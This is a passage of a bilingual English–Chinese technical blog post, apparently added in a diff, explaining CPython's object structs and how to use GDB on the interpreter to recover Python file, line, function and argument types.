+  &lt;p&gt;所有的 Python 類別(幾乎啦) 是用 PyTypeObject 物件來表示，定義在 &lt;em&gt;Python/Include/Object.h&lt;/em&gt;。這個結構包含一脫拉庫的欄位。大部分的欄位大概就是 “dunder” (編按：dunder 為 python 用來表示被雙底線夾住的目標，如 dunder getitem 就是 __getitem__)或 &lt;em&gt;__methods__&lt;/em&gt; 如何被實作的。使用標準的值(參照 PyType_Ready) 如果你不自己設定。這是一個落落長的資料結構，但在這裡提到是有意義的。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;typedef struct _typeobject {
+    PyObject_VAR_HEAD
+    const char *tp_name; /* For printing, in format &quot; */
+    Py_ssize_t tp_basicsize, tp_itemsize; /* For allocation */
+    /* Methods to implement standard operations */
+    destructor tp_dealloc;
+    printfunc tp_print;
+    getattrfunc tp_getattr;
+    setattrfunc tp_setattr;
+    comfunc tp_compare;
+    reprfunc tp_repr;
+    
+    /* Method suites for standard classes */
+    PyNumberMethods *tp_as_number;
+    PySequenceMethods *tp_as_sequence;
+    PyMappingMethods *tp_as_mapping;
+    /* More standard operations (here for binary compatiblility) */
+    hashfunc tp_hash;
+    ternaryfunc tp_call;
+    reprfunc tp_str;
+    getattrofunc tp_getattro;
+    setattrofunc tp_setattro;
+    
+    /* Functions to access object as input/output buffer */
+    PyBufferProcs *tp_as_buffer;
+    
+    /* Flags to define presence of optional/expanded features */
+    long tp_flags;
+                            
+    const char *tp_doc; /* Docuemntatioin string */
+    
+    /* Assigned meaning in release 2.0 */
+    /* call function for all accessible objects */
+    traverseproc tp_traverse;
+                            
+    /* delete refereces to contained objects */
+    inquiry tp_clear;
+    
+    /* Assigned meaning in release 2.1 */
+    /* rich comparisions */
+    richcmpfunc tp_richcompare;
+    
+    /* weak reference enabler */
+    Py_ssize_t tp_weaklistoffset;
+                            
+    /* Added in release 2.2 */
+    /* Iterators */
+    getiterfunc tp_iter;
+    iternextfunc tp_iternext;
+
+    /* Attribute descriptor and subclassing stuff */
+    struct PyMethodDef *tp_methods;
+    struct PyMemberDef *tp_members;
+    struct PyGetSetDef *tp_getset;
+    struct _typeobject *tp_base;
+    PyObject *tp_dict;
+    descrgetfunc tp_descr_get;
+    descrsetfunc tp_descr_set;
+    Py_ssize_t tp_dictoffset;
+    initproc tp_init;
+    allocfunc tp_alloc;
+    newfunc tp_new;
+    freefunc tp_free; /* Low-level free-memory routine */
+    inquiry tp_is_gc; /* For PyObject_IS_GC */
+    PyObject *tp_bases;
+    PyObject *tp_mro; /* method resolution order */
+    PyObject *tp_cache;
+    PyObject *tp_subclasses;
+    PyObject *tp_weaklist;
+    destructor tp_del;
+
+    /* Type attribute cache version tag. Added in version 2.6 */
+    unsigned int tp_version_tag;
+
+#ifdef COUNT_ALLOCS
+    /* these must be last and never explicitly initialized */
+    Py_ssize_t tp_allocs;
+    Py_ssize_t tp_frees;
+    Py_ssize_t tp_maxalloc;
+    struct _typeobject *tp_prev;
+    struct _typeobject *tp_next;
+#endif                            
+} PyTypeObject;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The typedef (typedefs? Anyone know the plural of #typedef?) above (i.e. PyNumberMethods) are the C-level equivalent of the double underscore methods required to implement a certain protocol (programmatic interface). They expand into method collections:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;typedef&lt;/em&gt; (typedefs? 有任何人知道這個 typedef 的複數嗎?) 之上 (如 PyNumberMethods) 是 C 層級等同於雙底線方法，是實作一個特定協定必須的 (計畫性的介面)。他們擴展成方法的集合:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;typedef struct {
+    lenfunc mp_length;
+    binaryfunc mp_subscript;
+    objobjargproc mp_ass_subscript;
+} PyMappingMethods;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;These translate into len, subscript, and subscript assignment.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;這些翻譯成 &lt;em&gt;len&lt;/em&gt;、&lt;em&gt;subscript&lt;/em&gt;與 &lt;em&gt;subscript 賦值&lt;/em&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;instances--實例&quot;&gt;Instances / 實例&lt;/h3&gt;
+
+&lt;p&gt;All Python instances are all implemented as pointers to PyObject values, which is defined as:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;所有的 Python 實例都是實作成指標指向 PyObject，定義如&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;typedef struct _object {
+    PyObject_HEAD
+} PyObject;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;PyObject_HEAD, by default, expands to include only a pointer to the object’s type (type objects have a type of type!) and the reference count.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;預設為 PyObject_HEAD，擴展包括只有一個指標指向物件的型態(type 物件有一個型態的型態!) 與 參考計量。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/* PyObject_HEAD defines the initial segment of every PyObject. */
+#define PyObject_HEAD                   \
+    _PyObject_HEAD_EXTRA                \
+    Py_ssize_t ob_refcnt;               \
+    struct _typeobject *ob_type;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Wait! Where is all of the per-instance data you say? For classes that do not define __slots__, there is a dictoffset member of the corresponding PyTypeObject structure. This provides the address, via offset from the end of the PyObject structure, that contains a Python dictionary. This is the __dict__ used to store per instance information.  If __slots__ is defined, then dictoffset is NULL and the slot values are stored at the end of the PyObject structure and accessed via descriptors. Generic structures are passed around via casting (and turned back into concrete values via the same method).&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;等等! 你說的每個實例的資料在哪裡 ? 對於沒有定義 &lt;em&gt;__slots__&lt;/em&gt; 的類別來說，有一個對應的 PyTypeObject 結構 &lt;em&gt;dictoffset&lt;/em&gt; 成員。透過從 PyObject 結構底部位移包含一個 Python 字典。這是 &lt;em&gt;__dict__&lt;/em&gt; 用來儲存每個實例的資訊。倘若有定義 &lt;em&gt;__slots__&lt;/em&gt;，則 dictoffset 為 &lt;em&gt;NULL&lt;/em&gt; 且位置值被存放在 PyObject 結構底部並透過描述子存取。一般的結構透過轉型到處傳遞(而且透過一樣的方法轉變回具體的值)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Somewhat related bonus Python trivia: The class dictionary is actually a PyDictProxy_Type that refers to the type’s tp_dict field.  You can’t edit it directly.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;一點相關的額外 Python 瑣事: 字典類別實際上是一個 PyDictProxy_Type 參考自 type 的 tp_dict 欄位。你不能直接修改他。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;To clarify, assuming we have a type NinjaTurtle that is represented by PyTypeObject *ninja, then for an instance donatello, the following is true: (PyObject *)donatello-&amp;gt;ob_type = ninja; Good. So, naturally, to perform an init call, the corresponding code would like like the following:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;為了闡明一點，假設我們有一個型別 &lt;em&gt;NinjaTurtle&lt;/em&gt; 是用 &lt;em&gt;PyTypeObject *ninja&lt;/em&gt; 來表示，那麼有一個實例 &lt;em&gt;donatello&lt;/em&gt;(編按:其中一隻忍者龜的名字)，則下列為真: &lt;em&gt;(PyOject *)donatello-&amp;gt;ob_type = ninja;&lt;/em&gt; 很好。所以，自然地，為了表現一個初始化呼叫，對應的程式碼可能看起來(編按: 原文為 like like 應為打錯，故翻為 look like)如下:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;donatello-&amp;gt;ob_type-&amp;gt;tp_init((PyObject *)donatello);&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;In fact, this is almost exactly what happens when a type is called directly (ala class instantiation: MyClass()).&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;事實上，這是當一個類型被直接呼叫的時候幾乎會發生的事情(也稱為類別實例化: MyClass()，編按:原文又把 aka 打成 ala 了…)。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;code-objects--程式碼物件&quot;&gt;Code Objects / 程式碼物件&lt;/h3&gt;
+
+&lt;p&gt;Let’s look at one final object, the code object. This is represented by a structure defined in code.h.  It is rather simple object (though note the first member).&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;讓我們來看最後一個物件，程式碼物件。在 &lt;em&gt;code.h&lt;/em&gt; 使用一個結構來定義。這是一個相當簡單的物件 (不過請注意第一個成員)。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/* Bytecode object */
+typedef struct {
+    PyObject_HEAD
+    int co_argcount;    /* #arguments, except *args */
+    int co_nlocals;   /* #local variables */
+    int co_stacksize;   /* #entries needed for evaluation stack */
+    int co_flags;   /* CO_..., see below */
+    PyObject *co_code;    /* instruction opcodes */
+    PyObject *co_consts;  /* list (constants used) */
+    PyObject *co_names;   /* list of strings (names used) */
+    PyObject *co_varnames;  /* tuple of strings (local variable names) */
+    PyObject *co_freevars;  /* tuple of strings (free variable names) */
+    PyObject *co_cellvars;      /* tuple of strings (cell variable names) */
+    /* The rest doesn't count for hash/cmp */
+    PyObject *co_filename;  /* string (where it was loaded from) */
+    PyObject *co_name;    /* string (name, for reference) */
+    int co_firstlineno;   /* first source line number */
+    PyObject *co_lnotab;  /* string (encoding addr&amp;lt;-&amp;gt;lineno mapping) See
+           Objects/lnotab_notes.txt for details. */
+    void *co_zombieframe;     /* for optimization only (see frameobject.c) */
+    PyObject *co_weakreflist;   /* to support weakrefs to code objects */
+} PyCodeObject;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From here, we can switch into Python. Note the above fields and then have a peek at a function’s func_code attribute (__code__ in 3.x):&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;從這裡，我們可以切換到 Python。注意上面的欄位並且看一下函式的 &lt;em&gt;func_code&lt;/em&gt; 屬性 (在 py3 為 &lt;em&gt;__code__&lt;/em&gt;)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt;
+&amp;gt;&amp;gt;&amp;gt; def f(): pass
+...
+[66987 refs]
+&amp;gt;&amp;gt;&amp;gt; import pprint
+[67863 refs]
+&amp;gt;&amp;gt;&amp;gt; pprint.pprint(dir(f.func_code))
+['__class__',
+'__delattr__',
+'__dir__',
+'__doc__',
+'__eq__',
+'__format__',
+'__ge__',
+'__getattribute__',
+'__gt__',
+'__hash__',
+'__init__',
+'__le__',
+'__lt__',
+'__ne__',
+'__new__',
+'__reduce__',
+'__reduce_ex__',
+'__repr__',
+'__setattr__',
+'__sizeof__',
+'__str__',
+'__subclasshook__',
+'co_argcount',
+'co_cellvars',
+'co_code',
+'co_consts',
+'co_filename',
+'co_firstlineno',
+'co_flags',
+'co_freevars',
+'co_kwonlyargcount',
+'co_lnotab',
+'co_name',
+'co_names',
+'co_nlocals',
+'co_stacksize',
+'co_varnames']
+[67870 refs]
+&amp;gt;&amp;gt;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Perfect. Now we’ve made the connection between Python and C. Now we can take a look at the actual debugging process.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;完美。現在我們將 Python 與 C 連接起來了。我們可以來瞧瞧真正的除錯行程了。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;gdbing-the-py--來-gdb-py-吧&quot;&gt;GDB’ing the Py. / 來 GDB Py 吧&lt;/h3&gt;
+
+&lt;p&gt;We’ll use the same small bit of code we used above as our test script. We’re referencing /usr/bin/python here, which may vary on your system.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我們將使用同上面一樣的小程式來當測試程式。我們這裡參考到 /usr/bin/python，在你系統上可能不同。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;First, we’ll start the interpreter. Note that we’re debugging Python itself, not the script passed to it. GDB will not start if we pass in the Python script as the executable.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;首先我們開啟直譯器。注意我們是要除錯 python 而非被傳進去腳本程式。如果我們傳入 python 腳本當作執行檔 GDB 將不會啟動。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jeff@martian:~/cpython$ gdb /usr/bin/python
+GNU gdb (GDB) 7.4-gg1
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
+and &quot;show warranty&quot; for details.
+This GDB was configured as &quot;x86_64-linux&quot;.
+
+Reading symbols from /usr/bin/python...
+Reading symbols from /usr/lib/debug/usr/bin/python...done.
+done.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we’ll set the appropriate args for the execution of Python — our script. Note that nothing is running at this point.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;現在我們要設定 python 執行參數 - 我們的腳本。
+請注意現在是沒有任何東西在執行的。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) set args add.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, since we want to see how to pick apart the location of our Python code from the C level, we’ll set a breakpoint at PyEval_EvalCodeEx. This forces GDB to up and stop when it gets to our function.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;現在，由於我們要觀察如何對我們的 python 程式碼在 C 語言層級吹毛求疵，我們將設下一個斷點在 &lt;em&gt;PyEval_EvalCodeEx&lt;/em&gt;。強迫 GDB 執行到我們的函式時停下來。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) break PyEval_EvalCodeEx
+Breakpoint 1 at 0x80e1f53: file ../../../Python/ceval.c, line 2767.
+(gdb)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note that if the correct source is available, this gets much easier as there is Python+GDB integration available via python-gdb.py. Now, we can run the executable:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;如果正確的原始碼是可取得的，這將會容易很多如同那些 Python+GDB 整合工具一樣。現在我們可以執行可執行檔：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) run
+Starting program: /usr/bin/python add.py
+
+Breakpoint 1, PyEval_EvalCodeEx (co=0xf7de7338, globals=0xf7df313c,
+   locals=0xf7df313c, args=0x0, argcount=0, kws=0x0, kwcount=0,
+   defs=0x0, defcount=0, closure=0x0)
+at ../../../Python/ceval.c:2767
+2767 ../../../Python/ceval.c: No such file or directory.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;understanding-the-object-representation--理解物件表示法&quot;&gt;Understanding the Object Representation / 理解物件表示法&lt;/h3&gt;
+
+&lt;p&gt;From here, we can examine the code in question. First, let’s print the value of the first argument to PyEval_EvalCodeEx. From our prototype above, we know this is a code object:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;從這裡開始，我們可以檢查程式碼裡的問題了。首先，讓我們印出 &lt;em&gt;PyEval_EvalCodeEx&lt;/em&gt; 的第一個參數。根據我們上面的原型，我們知道這是一個程式碼物件：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p *co
+$1 = {ob_refcnt = 1, ob_type = 0x81a1e60, co_argcount = 0,
+  co_nlocals = 0, co_stacksize = 1, co_flags = 64,
+  co_code = 0xf7dedd40, co_consts = 0xf7dedd0c,
+  co_names = 0xf7dc102c, co_varnames = 0xf7dc102c,
+  co_freevars = 0xf7dc102c, co_cellvars = 0xf7dc102c,
+  co_filename = 0xf7de4200, co_name = 0xf7dedd60,
+  co_firstlineno = 1, co_lnotab = 0xf7dc10b0, co_zombieframe = 0x0}
+(gdb)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here, we see the ob_refcnt and the ob_type. If we cast this to a PyObject *, you’ll see that it only prints that information.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;這裡，我們看到 &lt;em&gt;ob_refcnt&lt;/em&gt; 與 &lt;em&gt;ob_type&lt;/em&gt;。如果我們把它轉型成一個 &lt;em&gt;PyObject *&lt;/em&gt;(編按：表示為 PyObject 指標)，你將會看到它唯一印出的資訊。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p *(PyObject *)co
+$4 = {ob_refcnt = 1, ob_type = 0x81a1e60}
+(gdb)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ok, let’s step ahead until we see something interesting. We’ll “GDB continue” until we have an args=&amp;lt;value&amp;gt; which is not 0×0, or NULL.  We’ll look at the following frame:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;好的，讓我們前進一步直到我們看到一些某些有去的東西。我們將 “GDB continue” 到我們有一個 args=&amp;lt;value&amp;gt; 不是 0x0 或是 NULL 為止。我們將看到如下的 frame：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Breakpoint 1, PyEval_EvalCodeEx (co=0xf7d8cc80, globals=0xf7d8a35c, locals=0x0,
+  args=0x81bfe7c, argcount=0, kws=0x81bfe7c, kwcount=0, defs=0x0,
+   defcount=0, closure=0x0)
+at ../../../Python/ceval.c:2767
+2767 in ../../../Python/ceval.c
+(gdb) info frame
+Stack level 0, frame at 0xfffec7a0:
+eip = 0x80e1f53 in PyEval_EvalCodeEx (../../../Python/ceval.c:2767);
+  saved eip 0x80e0cd2
+called by frame at 0xfffec890
+source language c.
+Arglist at 0xfffec798, args: co=0xf7d8cc80, globals=0xf7d8a35c,
+  locals=0x0, args=0x81bfe7c,
+  argcount=0, kws=0x81bfe7c, kwcount=0, defs=0x0, defcount=0, closure=0x0
+Locals at 0xfffec798, Previous frame's sp is 0xfffec7a0
+Saved registers:
+ebx at 0xfffec78c, ebp at 0xfffec798, esi at 0xfffec790,
+  edi at 0xfffec794, eip at 0xfffec79c
+(gdb)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;First, let’s have a look at the co value again:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;首先，讓我們再看一下 &lt;em&gt;co&lt;/em&gt; 的值：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p *co
+$10 = {ob_refcnt = 2, ob_type = 0x81a1e60, co_argcount = 0,
+       co_nlocals = 0, co_stacksize = 1,
+       co_flags = 99, co_code = 0xf7d8e688,
+       co_consts = 0xf7d8ddac, co_names = 0xf7dc102c,
+       co_varnames = 0xf7dc102c, co_freevars = 0xf7dc102c,
+       co_cellvars = 0xf7dc102c,
+       co_filename = 0xf7d8cc38, co_name = 0xf7d8ddc0,
+       co_firstlineno = 51, co_lnotab = 0xf7d8dde0,
+       co_zombieframe = 0x0}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;building-a-python-friendly-backtrace--建立一個-python-友善的回溯&quot;&gt;Building a Python Friendly Backtrace / 建立一個 Python 友善的回溯&lt;/h3&gt;
+
+&lt;p&gt;Now we can deduce where exactly this code comes from. We can pull the line number, the function name, and the file!&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;現在我們可以推斷至這個程式碼確切是從哪來的。我們可以調出程式碼的行號、函式名稱及檔案位置。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p co-&amp;gt;co_firstlineno
+$16 = 51
+(gdb) x/s ((PyStringObject)*co-&amp;gt;co_name)-&amp;gt;ob_sval
+0xf7d8ddd4: &quot;_g&quot;
+(gdb) x/s ((PyStringObject)*co-&amp;gt;co_filename)-&amp;gt;ob_sval
+0xf7d8cc4c: &quot;/usr/lib/python2.6/types.py&quot;
+(gdb)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, types.py, line 51, function _g. Let’s take a look:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;所以，type.py, 行 51, 函數 _g。讓我們看一下：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jeff@martian:~$ head /usr/lib/python2.6/types.py -n 51 | tail -n 1
+def _g():
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Excellent. This is where our Python function lives! There’s no point in going into it, however, this gives us a starting point to determine where a problem lives.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;棒棒。這就是我們 Python 函式的所在！已經沒有理由再這個點深入了，然而這給了我們一個起始點去確定哪裡有問題。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;looking-up-argument-types-and-values--查找參數型態與值&quot;&gt;Looking up Argument Types and Values / 查找參數、型態與值&lt;/h3&gt;
+
+&lt;p&gt;Furthermore, we can pull out information about the arguments passed as well.  Let’s go back and determine what the type is. Remember our ‘info frame’ gave us an args parameter?&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;此外，我們也可以調出有關傳入參數的資訊。讓我們回到確定型態的那裡。記得我們 ‘info frame’ 給我們一個 args 參數嘛？&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) p *args
+$21 = (PyObject *) 0x0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Drat! Null. This function takes no arguments.  Let’s jump down a few more frames until we find a function that includes an argument.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;該死！ Null. 這個函式沒有函數。讓我們往下跳一些 frame 直到我們找到一個有參數的函式。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Breakpoint 1, PyEval_EvalCodeEx (co=0xf7d9f8d8, globals=0xf7d8a9bc, locals=0x0,
+  args=0xf7d9e1c8, argcount=4, kws=0x0, kwcount=0, defs=0x0, defcount=0, closure=0x0)
+at ../../../Python/ceval.c:2767
+2767 in ../../../Python/ceval.c
+(gdb) info frame
+Stack level 0, frame at 0xfffefa50:
+eip = 0x80e1f53 in PyEval_EvalCodeEx (../../../Python/ceval.c:2767);
+  saved eip 0x813e70e
+called by frame at 0xfffefac0
+source language c.
+Arglist at 0xfffefa48, args: co=0xf7d9f8d8, globals=0xf7d8a9bc, locals=0x0,
+  args=0xf7d9e1c8, argcount=4, kws=0x0, kwcount=0, defs=0x0, defcount=0, closure=0x0
+Locals at 0xfffefa48, Previous frame's sp is 0xfffefa50
+Saved registers:
+ebx at 0xfffefa3c, ebp at 0xfffefa48, esi at 0xfffefa40, edi at 0xfffefa44,
+  eip at 0xfffefa4c
+(gdb)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here we go. Now, using the above “trick”, we learn that this is line 78 in method __new__ in abc.py:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;有啦。現在使用在上面的 “小技巧”，我們知道這是在 abc.py 第 78 行的 __new__ 方法。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb)p co-&amp;gt;co_firstlineno
+$24 = 78
+(gdb) x/s ((PyStringObject)*co-&amp;gt;co_name)-&amp;gt;ob_sval
+0xf7dc4694: &quot;__new__&quot;
+(gdb) x/s ((PyStringObject)*co-&amp;gt;co_filename)-&amp;gt;ob_sval
+0xf7d9f8a4: &quot;/usr/lib/python2.6/abc.py&quot;
+(gdb)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Perfect. Now, since __new__ is (sometimes) indicative of a metaclass — and we’re looking at code from the Abstract Base Class module which I happen to know goes metaclass crazy — we should have a class, a name, a bases tuple, and an object dictionary. Let’s look at the object types:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;水喔。由於 __new__ (有時候)表示一個元類別 - 而且我們正看著 Abstract Base Class 模組的程式碼，我剛好知道那個鬼元類別 - 我們應該要有一個類別、一個名字、一的基礎元組和一個物件字典。讓我們看一下這個物件型態：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/s args[0]-&amp;gt;ob_type.tp_name
+0x81590e5 &amp;lt;.LC33+5012&amp;gt;: &quot;type&quot;
+(gdb) x/s args[1]-&amp;gt;ob_type.tp_name
+0x8158d74 &amp;lt;.LC33+4131&amp;gt;: &quot;str&quot;
+(gdb) x/s args[2]-&amp;gt;ob_type.tp_name
+0x8158f43 &amp;lt;.LC33+4594&amp;gt;: &quot;tuple&quot;
+(gdb) x/s args[3]-&amp;gt;ob_type.tp_name
+0x8156ea5 &amp;lt;.LC16+1319&amp;gt;: &quot;dict&quot;
+(gdb)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Perfect! We’ve found the location of the code executing and the types of arguments that it takes.  What if we wanted to see, for example, the actual name passed in instead of the “str” type? Simple. We just repeat what we’ve already learned:&lt;/p&gt;
+
+&lt;p&gt;讚啦！我們找到了程式碼執行與參數型態用到的位置了。舉例來說，如果我們要看確切傳入的名字而非 “str” 型態？簡單。我們只要重複我們已經學到的：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/s (*(PyStringObject *)args[1]).ob_sval
+0xf7d96054: &quot;Hashable&quot;
+(gdb) p (*(PyStringObject *)args[1]).ob_refcnt
+$38 = 8
+(gdb)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we know, without looking at a line of Python, that this is the __new__ method of the metaclass for the Hashable ABC and the name of the class has a reference count of 8.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;現在我們知道，不用看一行 Python 程式碼，這是一個 __new__ 元類別的方法用來可雜湊的 ABC 與類別名跟參考計量為 8。&lt;/p&gt;
+&lt;/blockquote&gt;
+
